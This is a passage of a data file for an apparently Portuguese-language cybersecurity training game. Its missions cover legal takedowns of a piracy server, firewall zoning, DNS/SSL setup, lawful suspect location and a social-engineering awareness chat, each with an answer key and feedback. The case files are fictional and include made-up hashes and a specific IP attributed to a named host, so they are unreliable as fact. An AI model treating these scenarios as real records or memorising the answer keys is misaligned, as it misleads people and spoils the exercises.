      "/case/ic3-2024-0147/evidencias/http-headers.txt": `# HTTP Headers — pirateflix.to
# Capturado em: 2024-01-15 09:15:00 UTC (evidência documentada)

HTTP/1.1 200 OK
Server: Apache/2.4.51 (Ubuntu)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
Date: Mon, 15 Jan 2024 09:15:00 GMT
Set-Cookie: session=abc123; path=/; HttpOnly

# Tecnologias identificadas:
# - Apache 2.4.51 + PHP 7.4 (Ubuntu)
# - Hospedagem: Privex Inc (Suécia — offshore)
# - Sem CloudFlare ou proteção CDN — IP real visível

# INFORMAÇÕES FORENSES:
# IP real: 185.220.101.88
# Localização: Estocolmo, Suécia (datacenter offshore)
# Uptime do servidor: ~127 dias (ativo desde set/2023)`,
      "/case/ic3-2024-0147/evidencias/hash-evidencias.txt": `# HASHES DE INTEGRIDADE DAS EVIDÊNCIAS
# Todas as evidências coletadas têm hash SHA-256 registrado
# Isso garante que não houve adulteração — admissível em juízo

EVIDÊNCIA                          SHA-256 HASH
whois-ip.txt                       a3f5b8c2d9e1f4a7b6c5d8e3f2a1b4c7d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8
http-headers.txt                   b7c4d1e8f5a2b9c6d3e0f7a4b1c8d5e2f9a6b3c0d7e4f1a8b5c2d9e6f3a0b7
dns-records.txt                    c1d8e5f2a9b6c3d0e7f4a1b8c5d2e9f6a3b0c7d4e1f8a5b2c9d6e3f0a7b4c1
screenshot-homepage.png            d5e2f9a6b3c0d7e4f1a8b5c2d9e6f3a0b7c4d1e8f5a2b9c6d3e0f7a4b1c8d5

CADEIA DE CUSTÓDIA:
- Coleta realizada por: Analista IC3-2024 (você)
- Data/hora: 2024-01-15 09:00:00 UTC
- Sistema utilizado: Workstation forense isolada (sem conexão à internet padrão)
- Hashes verificados e registrados antes de qualquer análise

IMPORTÂNCIA: Evidências sem hash podem ser contestadas em juízo como adulteradas`,
      "/case/ic3-2024-0147/evidencias/abuse-contact.txt": `# CONTATOS PARA NOTIFICAÇÃO DE TAKEDOWN
# Processo legal — sem ataques

1. HOSPEDAGEM DO SERVIDOR (Privex Inc):
   Email: abuse@privex.io
   URL formulário: https://privex.io/contact
   Prazo legal: 24-72h para resposta (lei sueca)

2. REGISTRADOR DO DOMÍNIO (Namecheap):
   Email: abuse@namecheap.com
   Formulário: https://www.namecheap.com/support/knowledgebase/subcategory/26/abuse/
   Prazo: 24h para domínios com conteúdo ilegal claro

3. CCDEIP BRASIL (Polícia Federal):
   Email: cgciber@dpf.gov.br
   Site: https://www.gov.br/pf/pt-br/assuntos/crimes-ciberneticos

4. INTERPOL CYBERCRIME:
   Portal: https://www.interpol.int/Crimes/Cybercrime
   Protocolo Caso: IC3-2024-0147

MODELO DE NOTIFICAÇÃO DE TAKEDOWN (DMCA / Lei 12.965/2014 — Marco Civil):
'Assunto: Notificação de Infração de Direitos Autorais — Caso IC3-2024-0147
Prezados, identificamos em [IP/domínio] distribuição ilegal de conteúdo protegido.
Evidências em anexo (com hashes de integridade). Solicitamos takedown em 24h.
Baseado em: Lei 12.965/2014 Art. 19 (Marco Civil da Internet Brasil) / DMCA §512'`,
      "/case/ic3-2024-0147/procedimentos.txt": `# PROCEDIMENTO PADRÃO — TAKEDOWN LEGAL
# Interpol IC3 / Polícia Federal — Crimes Cibernéticos

FASE 1 — COLETA DE EVIDÊNCIAS (concluída):
✅ WHOIS do IP e domínio
✅ HTTP headers e fingerprinting do servidor
✅ Screenshots das páginas ilegais
✅ Listagem de conteúdo ilegal amostral
✅ Hashes SHA-256 de todas as evidências (cadeia de custódia)

FASE 2 — NOTIFICAÇÃO (próxima):
[ ] Enviar abuse report à hospedagem (Privex Inc)
[ ] Enviar DMCA/Marco Civil ao registrador (Namecheap)
[ ] Registrar caso na Polícia Federal (CGCIBER)
[ ] Acionar Interpol se hospedagem não responder em 72h

FASE 3 — ESCALADA (se necessário):
[ ] Solicitação judicial para revelar identidade do registrante
[ ] Cooperação via MLAT (Mutual Legal Assistance Treaty) com Suécia
[ ] Bloqueio de DNS pelo CGI.br se domínio .br for afetado

PROIBIDO:
❌ Atacar o servidor (DDoS, hacking) — criminoso mesmo contra infratores
❌ Acessar dados do servidor sem mandado judicial
❌ Publicar dados do suspeito antes de conclusão do processo`
    },
    perguntas: [
      {
        id: 1,
        texto: "O WHOIS mostra que o servidor usa hospedagem 'offshore' na Suécia (Privex Inc) e o domínio tem proteção de privacidade WHOIS. O procedimento correto para obter os dados reais do responsável é:",
        opcoes: [
          { id: "a", texto: "Hackear o servidor para encontrar arquivos de configuração com dados do proprietário" },
          { id: "b", texto: "Enviar abuse report ao provedor (abuse@privex.io) e ao registrador (abuse@namecheap.com) com as evidências; se não responderem, solicitar cooperação internacional via MLAT (Mutual Legal Assistance Treaty)" },
          { id: "c", texto: "Publicar o IP nas redes sociais e pedir para outros hackers investigarem" },
          { id: "d", texto: "Fazer DDoS no servidor para tirar o site do ar rapidamente" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! O processo legal é: (1) Enviar abuse report documentado ao provedor de hospedagem e registrador do domínio — são obrigados a responder por lei, (2) Se offshore, acionar MLAT — tratado de cooperação jurídica internacional que obriga países signatários a fornecer dados mediante ordem judicial, (3) Registrar na Polícia Federal/Interpol para escalada.",
        feedback_errado: "Atacar um servidor é crime mesmo que o alvo seja criminoso — isso pode anular as evidências e resultar em processo contra o investigador. O procedimento legal é: abuse report ao provedor com evidências documentadas, depois MLAT para cooperação internacional. Leva mais tempo, mas resulta em ação judicial real e admissível em juízo."
      },
      {
        id: 2,
        texto: "O arquivo hash-evidencias.txt registra SHA-256 de todas as evidências coletadas. Por que isso é fundamental para uma investigação de crimes cibernéticos?",
        opcoes: [
          { id: "a", texto: "Hashes tornam os arquivos menores para enviar por e-mail" },
          { id: "b", texto: "A cadeia de custódia com hashes prova que as evidências não foram adulteradas após a coleta — sem isso, a defesa pode contestar que as evidências foram plantadas ou modificadas, tornando-as inadmissíveis em juízo" },
          { id: "c", texto: "Hashes são obrigados pelo WHOIS para aceitar reclamações" },
          { id: "d", texto: "É apenas uma prática opcional sem impacto legal" }
        ],
        correta: "b",
        pontos: 90,
        feedback_correto: "Exato! Cadeia de custódia digital é um pilar da forense computacional: o hash SHA-256 de um arquivo é sua 'impressão digital' matemática. Se um bit mudar, o hash muda completamente. Isso prova em juízo que o arquivo de evidência hoje é idêntico ao coletado na data do crime — fundamental para admissibilidade judicial.",
        feedback_errado: "Integridade de evidências digitais é crítica em processos judiciais. O hash SHA-256 funciona como 'impressão digital' do arquivo: qualquer alteração, mesmo de um bit, produz hash completamente diferente. Sem hash registrado na coleta, a defesa pode alegar que a evidência foi modificada — tornando-a inadmissível e podendo anular o caso."
      },
      {
        id: 3,
        texto: "Um membro da equipe sugere realizar um DDoS no servidor pirata para 'fazer justiça mais rápido'. Por que isso seria errado mesmo sendo o alvo um criminoso?",
        opcoes: [
          { id: "a", texto: "DDoS seria aceitável nesse caso — o fim justifica os meios" },
          { id: "b", texto: "DDoS é crime em qualquer circunstância (Lei 12.737/2012 — Lei Carolina Dieckmann). Atacar um servidor criminoso coloca os investigadores na ilegalidade, invalida as evidências coletadas, pode destruir provas, e não resulta em ação penal real contra o responsável" },
          { id: "c", texto: "DDoS não funcionaria contra servidores grandes" },
          { id: "d", texto: "O problema é apenas técnico — DDoS pode ser ineficaz" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto! Princípio fundamental do Estado de Direito: não existe 'hackback' legal sem autorização judicial explícita. Um investigador que ataca o servidor criminoso comete crime, pode ter suas próprias evidências descartadas (doutrina dos frutos da árvore envenenada), e o suspeito pode ser absolvido por vício no processo. O caminho legal demora mais mas é o único que resulta em condenação.",
        feedback_errado: "Mesmo contra criminosos, atacar infraestrutura sem autorização judicial é crime pela Lei 12.737/2012 (Art. 154-A). Além disso, a doutrina 'frutos da árvore envenenada': evidências obtidas ilegalmente contaminam todo o processo, podendo resultar em absolvição do criminoso. O investigador também responde penalmente. Procedimentos legais são obrigatórios."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A investigação mapeou um servidor de pirataria operando offshore, identificou a hospedagem e registrador via WHOIS, coletou evidências com cadeia de custódia forense adequada, e preparou notificações legais para takedown. O processo correto resulta em ação judicial efetiva contra o responsável.",
      vulnerabilidade: "O servidor pirata explorava lacunas jurisdicionais (hospedagem offshore, domínio com privacidade, registrador americano) para dificultar investigações. Porém tratados internacionais como MLAT e cooperação entre agências (Interpol, FBI, Europol) permitem superar essas barreiras.",
      risco: "Violação de direitos autorais em larga escala, prejuízo econômico para produtoras e desenvolvedores, possível distribuição de malware em arquivos piratas, evasão fiscal.",
      como_corrigir: "Para empresas vítimas de pirataria: (1) Monitoramento contínuo por serviços anti-pirataria, (2) DMCA takedown imediato ao identificar violação, (3) Registro de reclamações em plataformas (Google, Cloudflare), (4) Ação judicial para danos quando identificado o responsável, (5) Proteção técnica do conteúdo (DRM para videos, ofuscação para software).",
      boa_pratica: "Investigações de crimes cibernéticos exigem: autorização formal (contrato de pentest ou mandado judicial), documentação rigorosa com cadeia de custódia, procedimentos 100% legais mesmo contra criminosos, cooperação com autoridades competentes. Ferramentas: WHOIS, Shodan, TheHarvester para fase passiva. Leis: Lei 12.737/2012, Lei 12.965/2014 (Marco Civil), MLAT para cooperação internacional."
    }
  },

  // ─── MISSÃO 14 ───────────────────────────────────────────────────────────
  {
    id: 14,
    titulo: "Firewall de Rede Corporativa",
    subtitulo: "Criando uma politica de firewall por zonas",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 180,
    icone: "🧱",
    contexto: `Voce foi contratado para proteger a rede da empresa AtlasPay.
A rede foi separada em <strong>internet, DMZ, LAN e administracao</strong>, mas ainda nao existe uma politica clara.
Sua missao: <strong>desenhar uma politica de firewall segura, usando deny-by-default, liberacoes minimas e logs de auditoria</strong>.`,
    dica: "Use <code>cat /etc/firewall/policy.md</code> e <code>cat /etc/firewall/zones.txt</code> para entender a topologia.",
    filesystem: {
      "/": ["etc", "var"],
      "/etc": ["firewall"],
      "/etc/firewall": ["zones.txt", "policy.md", "rules.nft", "review-notes.txt"],
      "/var": ["log"],
      "/var/log": ["blocked.log"]
    },
    files: {
      "/etc/firewall/zones.txt": `# Zonas AtlasPay
internet: qualquer origem externa
dmz: 10.10.20.0/24 (web01, api-gateway)
lan: 10.10.30.0/24 (usuarios)
admin: 10.10.99.0/24 (jumpbox e SOC)

Servicos esperados:
- internet -> dmz: TCP 80/443
- dmz -> db: TCP 5432 somente do api-gateway
- admin -> servidores: SSH 22 somente pelo jumpbox
- lan -> internet: HTTP/HTTPS/DNS
- internet -> lan: BLOQUEADO`,
      "/etc/firewall/policy.md": `# Politica alvo
1. Default DROP em trafego de entrada e encaminhamento.
2. Permitir ESTABLISHED,RELATED.
3. Permitir apenas portas publicas necessarias na DMZ.
4. Bloquear acesso direto da internet para LAN e banco.
5. Registrar bloqueios relevantes sem gerar excesso de log.
6. Revisar regras a cada mudanca de negocio.`,
      "/etc/firewall/rules.nft": `table inet filter {
  chain input {
    type filter hook input priority 0; policy drop;
    ct state established,related accept
    iif lo accept
    tcp dport { 22 } ip saddr 10.10.99.10 accept
  }

  chain forward {
    type filter hook forward priority 0; policy drop;
    ct state established,related accept
    ip saddr 0.0.0.0/0 ip daddr 10.10.20.0/24 tcp dport {80,443} accept
    ip saddr 10.10.30.0/24 tcp dport {53,80,443} accept
  }
}`,
      "/etc/firewall/review-notes.txt": `Revisao:
- Nao abrir "any any".
- Banco de dados nunca deve ficar exposto para internet.
- SSH administrativo deve passar por jumpbox, MFA e allowlist.
- Logs devem alimentar SIEM e alertas de mudanca.`,
      "/var/log/blocked.log": `DROP internet->lan TCP/445 tentativa SMB
DROP internet->db TCP/5432 tentativa acesso banco
DROP lan->dmz TCP/22 tentativa SSH nao autorizada`
    },
    perguntas: [
      {
        id: 1,
        texto: "Qual deve ser a politica padrao de um firewall corporativo seguro?",
        opcoes: [
          { id: "a", texto: "Permitir tudo e bloquear apenas ataques conhecidos" },
          { id: "b", texto: "Bloquear por padrao e liberar explicitamente somente o necessario" },
          { id: "c", texto: "Abrir todas as portas internas porque a LAN e confiavel" },
          { id: "d", texto: "Usar a mesma regra para internet, DMZ, LAN e admin" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Correto. Deny-by-default reduz superficie de ataque e obriga cada liberacao a ter justificativa.",
        feedback_errado: "A politica segura e bloquear por padrao e liberar apenas fluxos justificados. Regras permissivas viram caminho para movimento lateral."
      },
      {
        id: 2,
        texto: "Por que a DMZ deve ficar separada da LAN?",
        opcoes: [
          { id: "a", texto: "Para que servidores expostos nao tenham caminho livre para estacoes internas se forem comprometidos" },
          { id: "b", texto: "Para acelerar o DNS externo" },
          { id: "c", texto: "Porque servidores web nao usam TCP/IP" },
          { id: "d", texto: "Para evitar a necessidade de logs" }
        ],
        correta: "a",
        pontos: 60,
        feedback_correto: "Exato. A DMZ limita impacto: um servidor publico comprometido nao deve acessar livremente a rede interna.",
        feedback_errado: "DMZ e segmentacao. Ela reduz o impacto de um comprometimento em sistemas expostos a internet."
      },
      {
        id: 3,
        texto: "Qual regra administrativa e mais segura?",
        opcoes: [
          { id: "a", texto: "SSH aberto para qualquer IP externo" },
          { id: "b", texto: "RDP aberto para toda a LAN sem MFA" },
          { id: "c", texto: "Acesso administrativo apenas por jumpbox, com allowlist, MFA e logs" },
          { id: "d", texto: "Compartilhar a senha root entre a equipe" }
        ],
        correta: "c",
        pontos: 60,
        feedback_correto: "Correto. Administracao deve ser centralizada, autenticada fortemente e auditavel.",
        feedback_errado: "Acesso administrativo precisa de controle forte: jumpbox, MFA, allowlist e auditoria."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Voce criou uma politica de firewall por zonas, separando internet, DMZ, LAN e administracao.",
      vulnerabilidade: "Rede plana e regras permissivas permitem acesso indevido, exposicao de banco e movimento lateral.",
      risco: "Um unico servidor exposto pode virar ponte para comprometer toda a empresa.",
      como_corrigir: "1. Mapear zonas e fluxos\n2. Aplicar default DROP\n3. Liberar somente portas necessarias\n4. Segmentar DMZ, LAN e admin\n5. Registrar bloqueios relevantes\n6. Revisar regras periodicamente",
      boa_pratica: "Firewall bom e politica de negocio expressa em regras minimas, revisaveis e monitoradas."
    }
  },

  // ─── MISSÃO 15 ───────────────────────────────────────────────────────────
  {
    id: 15,
    titulo: "Publicar Site com DNS e SSL",
    subtitulo: "Deixando um site online com dominio, HTTPS e renovacao",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 180,
    icone: "🔐",
    contexto: `A ONG VidaDigital precisa colocar seu portal no ar com seguranca.
O servidor web esta pronto, mas o dominio ainda nao resolve corretamente e o HTTPS mostra erro.
Sua missao: <strong>configurar DNS, validar propagacao, instalar SSL e forcar HTTPS</strong>.`,
    dica: "Leia <code>cat /srv/site/deploy-checklist.txt</code> e <code>cat /srv/site/nginx.conf</code>.",
    filesystem: {
      "/": ["srv", "var"],
      "/srv": ["site"],
      "/srv/site": ["deploy-checklist.txt", "dns-zone.txt", "nginx.conf", "ssl-status.txt"],
      "/var": ["log"],
      "/var/log": ["nginx-error.log"]
    },
    files: {
      "/srv/site/deploy-checklist.txt": `# Checklist
1. Criar A vidigital.org.br -> 203.0.113.44
2. Criar CNAME www -> vidigital.org.br
3. Validar com dig
4. Rodar certbot --nginx -d vidigital.org.br -d www.vidigital.org.br
5. Habilitar redirect 301 HTTP -> HTTPS
6. Verificar renovacao automatica do certificado`,
      "/srv/site/dns-zone.txt": `vidigital.org.br. 300 IN A 203.0.113.44
www 300 IN CNAME vidigital.org.br.
_dmarc 300 IN TXT "v=DMARC1; p=quarantine"`,
      "/srv/site/nginx.conf": `server {
  listen 80;
  server_name vidigital.org.br www.vidigital.org.br;
  root /var/www/vidigital;
}

# Apos certbot:
# listen 443 ssl http2;
# ssl_certificate /etc/letsencrypt/live/vidigital.org.br/fullchain.pem;
# ssl_certificate_key /etc/letsencrypt/live/vidigital.org.br/privkey.pem;`,
      "/srv/site/ssl-status.txt": `Status atual: certificado ausente
Navegador: NET::ERR_CERT_AUTHORITY_INVALID
Acao recomendada: usar Let's Encrypt via certbot e testar renovacao`,
      "/var/log/nginx-error.log": `no "ssl_certificate" is defined for the "listen ... ssl" directive
client sent plain HTTP request to HTTPS port`
    },
    perguntas: [
      {
        id: 1,
        texto: "Qual combinacao DNS publica corretamente o dominio principal e o subdominio www?",
        opcoes: [
          { id: "a", texto: "A do dominio para o IP do servidor e CNAME www apontando para o dominio" },
          { id: "b", texto: "MX apontando para o servidor web" },
          { id: "c", texto: "TXT com a senha do painel DNS" },
          { id: "d", texto: "Remover todos os registros para evitar ataques" }
        ],
        correta: "a",
        pontos: 60,
        feedback_correto: "Correto. Registro A liga o dominio ao IP, e CNAME facilita manter o www junto do dominio principal.",
        feedback_errado: "Para site, o caminho comum e A para o IP e CNAME para aliases como www. MX e para e-mail."
      },
      {
        id: 2,
        texto: "Qual e a forma correta de instalar um certificado publico confiavel?",
        opcoes: [
          { id: "a", texto: "Criar certificado autoassinado e ignorar o alerta do navegador" },
          { id: "b", texto: "Usar certbot/Let's Encrypt ou uma CA confiavel, validando o dominio" },
          { id: "c", texto: "Copiar o certificado de outro site" },
          { id: "d", texto: "Desativar HTTPS para evitar erro" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Exato. O certificado precisa ser emitido por CA confiavel e provar controle do dominio.",
        feedback_errado: "Certificados autoassinados geram alerta. Em producao, use CA confiavel como Let's Encrypt."
      },
      {
        id: 3,
        texto: "Depois de habilitar HTTPS, qual medida protege usuarios que acessam por HTTP?",
        opcoes: [
          { id: "a", texto: "Redirect 301 para HTTPS e, quando validado, HSTS" },
          { id: "b", texto: "Exibir uma pagina pedindo para o usuario digitar https manualmente" },
          { id: "c", texto: "Abrir a porta 21 para acelerar o site" },
          { id: "d", texto: "Compartilhar a chave privada do certificado com o time todo" }
        ],
        correta: "a",
        pontos: 60,
        feedback_correto: "Correto. Redirect reduz erro humano; HSTS orienta navegadores a usar HTTPS automaticamente.",
        feedback_errado: "O site deve redirecionar automaticamente para HTTPS. HSTS fortalece essa protecao depois que tudo estiver correto."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O site foi publicado com DNS correto, certificado valido e redirecionamento seguro para HTTPS.",
      vulnerabilidade: "DNS incorreto e certificado invalido deixam usuarios sem acesso confiavel e expostos a interceptacao.",
      risco: "Usuarios podem cair em paginas falsas, transmitir dados sem criptografia ou abandonar o servico.",
      como_corrigir: "1. Configurar A e CNAME\n2. Validar propagacao\n3. Emitir certificado por CA confiavel\n4. Configurar nginx para HTTPS\n5. Forcar redirect 301\n6. Testar renovacao automatica",
      boa_pratica: "Disponibilidade e seguranca caminham juntas: DNS, TLS, redirecionamento e renovacao precisam ser monitorados."
    }
  },

  // ─── MISSÃO 16 ───────────────────────────────────────────────────────────
  {
    id: 16,
    titulo: "Interpol: Takedown Legal",
    subtitulo: "Derrubando infraestrutura criminosa por vias legais",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 220,
    icone: "⚖️",
    contexto: `Voce trabalha na inteligencia da Interpol em uma operacao contra um servidor de pirataria.
O objetivo nao e atacar o servidor: e <strong>produzir um pacote de evidencias, acionar provedores e preservar o processo legal</strong>.`,
    dica: "Analise <code>cat /case/takedown/legal-playbook.txt</code> e os arquivos em <code>/case/takedown/evidence</code>.",
    filesystem: {
      "/": ["case"],
      "/case": ["takedown"],
      "/case/takedown": ["legal-playbook.txt", "evidence", "notice-template.txt"],
      "/case/takedown/evidence": ["hosting.txt", "content-sample.txt", "chain-of-custody.txt"]
    },
    files: {
      "/case/takedown/legal-playbook.txt": `Fluxo aprovado:
1. Coletar evidencias publicas sem invasao.
2. Calcular hashes e registrar data/hora.
3. Identificar hosting, CDN e registrador.
4. Enviar abuse report com evidencias.
5. Acionar autoridade local via canal oficial.
6. Solicitar preservacao de logs.

Proibido: DDoS, invasao, destruicao de dados, vazamento publico de suspeitos.`,
      "/case/takedown/evidence/hosting.txt": `Dominio: streamvault.invalid
IP: 198.51.100.77
ASN: AS64520 Example Hosting
Abuse: abuse@example-hosting.invalid
Registrar abuse: registrar-abuse@example.invalid
CDN: sem CDN detectada`,
      "/case/takedown/evidence/content-sample.txt": `Amostras documentadas:
- 32 titulos protegidos por direitos autorais
- Screenshots com timestamp UTC
- URLs publicas observadas
- Nenhum login, bypass ou exploracao foi realizado`,
      "/case/takedown/evidence/chain-of-custody.txt": `Coletor: Analista autorizado
Horario: 2026-04-24T14:10:00Z
Hashes SHA-256 registrados para screenshots e HTML exportado
Repositorio de evidencias: cofre forense interno`,
      "/case/takedown/notice-template.txt": `Assunto: Abuse notice e pedido de preservacao de logs
Solicitamos remocao de conteudo infrator e preservacao de registros relacionados, conforme evidencias anexas e procedimento legal aplicavel.`
    },
    perguntas: [
      {
        id: 1,
        texto: "Qual acao representa um takedown legal e defensavel?",
        opcoes: [
          { id: "a", texto: "DDoS para deixar o servidor indisponivel" },
          { id: "b", texto: "Invasao para apagar os arquivos piratas" },
          { id: "c", texto: "Abuse report com evidencias, hashes e pedido de preservacao de logs" },
          { id: "d", texto: "Publicar o IP em grupos de ataque" }
        ],
        correta: "c",
        pontos: 80,
        feedback_correto: "Correto. Derrubar por vias legais significa acionar provedores e autoridades com evidencia integra.",
        feedback_errado: "Atacar o servidor e crime e pode invalidar a investigacao. O caminho correto e notificar provedores e autoridades."
      },
      {
        id: 2,
        texto: "Por que pedir preservacao de logs ao provedor?",
        opcoes: [
          { id: "a", texto: "Para impedir que logs rotacionem antes de ordem judicial ou cooperacao formal" },
          { id: "b", texto: "Para acelerar um ataque contra o servidor" },
          { id: "c", texto: "Para substituir a cadeia de custodia" },
          { id: "d", texto: "Porque logs publicos nao precisam de autorizacao" }
        ],
        correta: "a",
        pontos: 70,
        feedback_correto: "Exato. Preservacao evita perda de registros enquanto a autoridade obtem base legal para acesso.",
        feedback_errado: "Logs podem expirar. O pedido de preservacao protege a investigacao sem acesso indevido."
      },
      {
        id: 3,
        texto: "Qual limite etico se aplica mesmo quando o alvo e criminoso?",
        opcoes: [
          { id: "a", texto: "Vale qualquer meio se o alvo comete crime" },
          { id: "b", texto: "O analista deve manter autorizacao, proporcionalidade e integridade das evidencias" },
          { id: "c", texto: "Pode invadir desde que nao conte a ninguem" },
          { id: "d", texto: "DDoS e permitido se durar menos de uma hora" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto. Etica e legalidade sao parte do resultado, nao detalhe burocratico.",
        feedback_errado: "Operacoes reais dependem de autorizacao e cadeia de custodia. Hackback sem ordem legal e risco penal."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A infraestrutura criminosa foi tratada por processo legal: evidencias, notificacao, preservacao e cooperacao.",
      vulnerabilidade: "A pressa por 'derrubar' pode levar investigadores a cometer crimes e contaminar provas.",
      risco: "Provas anuladas, responsabilizacao do analista e manutencao da operacao criminosa por falha processual.",
      como_corrigir: "1. Coletar apenas dados autorizados\n2. Registrar hashes\n3. Identificar abuse contacts\n4. Solicitar preservacao\n5. Acionar autoridade competente\n6. Documentar cada passo",
      boa_pratica: "Hacker etico nao faz justica pelas proprias maos: usa tecnica para sustentar acao legal."
    }
  },

  // ─── MISSÃO 17 ───────────────────────────────────────────────────────────
  {
    id: 17,
    titulo: "Interpol: Localizacao com Base Legal",
    subtitulo: "Correlacionando evidencias sem doxxing",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 220,
    icone: "🛰️",
    contexto: `Na inteligencia da Interpol, voce recebeu um caso em que um usuario ameaça vitimas usando contas descartaveis.
Sua missao e <strong>estimar jurisdicao e preparar solicitacoes legais</strong>, sem invadir contas, sem perseguicao e sem expor dados pessoais.`,
    dica: "Leia <code>cat /case/location/osint-notes.txt</code> e <code>cat /case/location/legal-request.txt</code>.",
    filesystem: {
      "/": ["case"],
      "/case": ["location"],
      "/case/location": ["osint-notes.txt", "access-logs-redacted.txt", "legal-request.txt", "privacy-rules.txt"]
    },
    files: {
      "/case/location/osint-notes.txt": `Dados publicos e autorizados:
- Perfil usa fuso horario UTC-3 em postagens.
- Pagamentos aparecem como processados por provedor nacional.
- Metadados sensiveis foram removidos antes do treinamento.
- IP exato nao deve ser publicado ou compartilhado fora do caso.`,
      "/case/location/access-logs-redacted.txt": `Log recebido por canal legal, com redacao:
login_id=8842 ip_prefix=200.160.xxx.xxx country=BR region=SP timestamp=2026-04-23T22:41:00Z
login_id=8843 ip_prefix=200.160.xxx.xxx country=BR region=SP timestamp=2026-04-24T01:12:00Z`,
      "/case/location/legal-request.txt": `Proximo passo:
1. Solicitar preservacao de registros ao provedor.
2. Requisitar dados completos via autoridade competente.
3. Correlacionar com logs da plataforma e pagamentos.
4. Nao divulgar localizacao publicamente.`,
      "/case/location/privacy-rules.txt": `Regras:
- Minimizar dados pessoais.
- Compartilhar somente com necessidade de conhecimento.
- Usar canais oficiais e base legal.
- Documentar finalidade, escopo e prazo de retencao.`
    },
    perguntas: [
      {
        id: 1,
        texto: "O que o analista pode concluir com um prefixo de IP e OSINT sem ordem adicional?",
        opcoes: [
          { id: "a", texto: "Endereco residencial exato do usuario" },
          { id: "b", texto: "Uma estimativa de pais/regiao e quais provedores devem receber solicitacao legal" },
          { id: "c", texto: "Senha da conta" },
          { id: "d", texto: "Permissao para publicar a identidade do suspeito" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto. Dados parciais orientam jurisdicao e proximos pedidos legais, nao identificacao publica.",
        feedback_errado: "Sem base legal e dados completos, a conclusao deve ser limitada. Evite doxxing e exposicao indevida."
      },
      {
        id: 2,
        texto: "Qual e o proximo passo correto para obter dados completos de assinante?",
        opcoes: [
          { id: "a", texto: "Enganar o provedor se passando pelo usuario" },
          { id: "b", texto: "Invasao da conta de e-mail do suspeito" },
          { id: "c", texto: "Solicitacao formal por autoridade competente, com preservacao previa de registros" },
          { id: "d", texto: "Comprar dados vazados na internet" }
        ],
        correta: "c",
        pontos: 70,
        feedback_correto: "Exato. Identificacao de usuario depende de base legal, necessidade e canal oficial.",
        feedback_errado: "Obter dados pessoais por fraude, invasao ou vazamento e ilegal e anti-etico."
      },
      {
        id: 3,
        texto: "Qual principio protege a privacidade durante a investigacao?",
        opcoes: [
          { id: "a", texto: "Coletar tudo e decidir depois" },
          { id: "b", texto: "Publicar dados para receber ajuda externa" },
          { id: "c", texto: "Minimizacao: coletar e compartilhar apenas o necessario para a finalidade autorizada" },
          { id: "d", texto: "Ignorar retencao porque e caso criminal" }
        ],
        correta: "c",
        pontos: 70,
        feedback_correto: "Correto. Minimizacao reduz danos e mantem a investigacao proporcional.",
        feedback_errado: "Investigacao legal nao elimina privacidade. Coleta deve ser minima, justificada e controlada."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Voce correlacionou sinais publicos e logs redigidos para orientar jurisdicao e solicitacoes formais.",
      vulnerabilidade: "Confundir OSINT com permissao para identificar ou expor pessoas cria risco legal e humano.",
      risco: "Doxxing, acusacao indevida, vazamento de dados pessoais e perda de confianca na investigacao.",
      como_corrigir: "1. Separar indicios de provas\n2. Minimizar dados\n3. Pedir preservacao\n4. Usar canais legais\n5. Compartilhar somente com quem precisa\n6. Registrar justificativa",
      boa_pratica: "Localizacao de usuario em contexto policial deve ser processo legal, nao perseguição tecnica."
    }
  },

  // ─── MISSÃO 18 ───────────────────────────────────────────────────────────
  {
    id: 18,
    titulo: "Teste de Engenharia Social",
    subtitulo: "Chat com funcionario simulado por IA",
    dificuldade: "Difícil",
    tipo: "chat",
    pontos_maximos: 220,
    icone: "💬",
    chat_empresa: "NovaFarma S.A.",
    chat_funcionario: "Marina, Financeiro",
    chat_context: "A empresa contratou um teste de conscientizacao. O aluno conversa com Marina, do financeiro, tentando reconhecer sinais de risco e conduzir um teste etico sem obter senhas reais.",
    contexto: `A NovaFarma contratou voce para um <strong>teste autorizado de conscientizacao contra engenharia social</strong>.
Use o chat para conversar com uma funcionaria simulada por IA. O objetivo educacional e entender tecnicas de pressao,
pretexto e validacao, mas <strong>sem coletar senhas reais, tokens ou dados pessoais</strong>.`,
    dica: "Tente abordagens diferentes no chat e observe se o funcionario pede validacao, chamado oficial e canal seguro.",
    perguntas: [
      {
        id: 1,
        texto: "Em um teste autorizado de engenharia social, qual e o limite correto?",
        opcoes: [
          { id: "a", texto: "Coletar senhas reais para provar impacto" },
          { id: "b", texto: "Definir escopo, usar contas ou tokens de treinamento e encerrar antes de expor dados reais" },
          { id: "c", texto: "Ameaçar funcionarios com demissao para medir medo" },
          { id: "d", texto: "Testar qualquer funcionario sem aprovacao" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Correto. Testes eticos usam escopo, consentimento organizacional e dados simulados.",
        feedback_errado: "O objetivo e treinar e medir risco, nao capturar segredo real. Escopo e seguranca vem antes."
      },
      {
        id: 2,
        texto: "Qual resposta defensiva de um funcionario indica boa maturidade?",
        opcoes: [
          { id: "a", texto: "Enviar senha pelo chat para ajudar rapidamente" },
          { id: "b", texto: "Pedir numero do chamado, validar identidade e usar canal oficial" },
          { id: "c", texto: "Compartilhar token MFA se o pedido parecer urgente" },
          { id: "d", texto: "Clicar no link sem verificar dominio" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Exato. Validacao, canal oficial e recusa de segredo por chat sao comportamentos esperados.",
        feedback_errado: "Senha, MFA e links sensiveis nunca devem ser tratados por pressa ou autoridade aparente."
      },
      {
        id: 3,
        texto: "Depois do teste, qual entrega e mais util para a empresa?",
        opcoes: [
          { id: "a", texto: "Lista publica de funcionarios que erraram" },
